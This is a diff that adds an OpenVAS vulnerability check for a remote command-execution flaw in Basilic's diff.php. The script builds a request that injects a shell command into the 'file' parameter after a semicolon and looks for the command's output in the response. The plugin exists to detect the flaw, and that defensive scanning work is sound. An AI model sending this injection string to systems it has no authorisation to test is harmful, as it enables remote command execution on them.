@@ -1,0 +1,93 @@
+###############################################################################
+# OpenVAS Vulnerability Test
+# $Id: gb_basilic_54234.nasl 3062 2016-04-14 11:03:39Z benallard $
+#
+# Basilic 'diff.php' Remote Command Execution Vulnerability
+#
+# Authors:
+# Michael Meyer <michael.meyer@greenbone.net>
+#
+# Copyright:
+# Copyright (c) 2012 Greenbone Networks GmbH
+#
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License
+# as published by the Free Software Foundation; either version 2
+# of the License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
+###############################################################################
+
+tag_summary = "Basilic is prone to a remote command-execution vulnerability.
+
+An attacker can exploit this issue to execute arbitrary commands
+within the context of the vulnerable application.
+
+Basilic 1.5.14 is vulnerable; other versions may also be affected.";
+
+
+if (description)
+{
+ script_id(103504);
+ script_bugtraq_id(54234);
+ script_tag(name:"cvss_base", value:"9.0");
+ script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
+ script_version ("$Revision: 3062 $");
+
+ script_name("Basilic 'diff.php' Remote Command Execution Vulnerability");
+
+ script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/54234");
+ script_xref(name : "URL" , value : "http://artis.imag.fr/Software/Basilic/");
+
+ script_tag(name:"last_modification", value:"$Date: 2016-04-14 13:03:39 +0200 (Thu, 14 Apr 2016) $");
+ script_tag(name:"creation_date", value:"2012-07-02 10:46:56 +0200 (Mon, 02 Jul 2012)");
+ script_summary("Determine if it is possible to execute a command");
+ script_category(ACT_ATTACK);
+  script_tag(name:"qod_type", value:"remote_vul");
+ script_family("Web application abuses");
+ script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
+ script_dependencies("find_service.nasl", "http_version.nasl");
+ script_require_ports("Services/www", 80);
+ script_exclude_keys("Settings/disable_cgi_scanning");
+ script_tag(name : "summary" , value : tag_summary);
+ exit(0);
+}
+
+include("http_func.inc");
+include("host_details.inc");
+include("http_keepalive.inc");
+   
+port = get_http_port(default:80);
+
+if(!get_port_state(port))exit(0);
+
+if(!can_host_php(port:port))exit(0);
+
+dirs = make_list("/basilic",cgi_dirs());
+
+commands = exploit_commands();
+
+foreach dir (dirs) {
+
+  foreach cmd (keys(commands)) {
+   
+    url = string(dir, "/Config/diff.php?file=;",commands[cmd],"&new=1&old=2"); 
+
+    if(http_vuln_check(port:port, url:url,pattern:cmd)) {
+     
+      security_message(port:port);
+      exit(0); 
+
+    }
+
+  }  
+}
+
+exit(0);
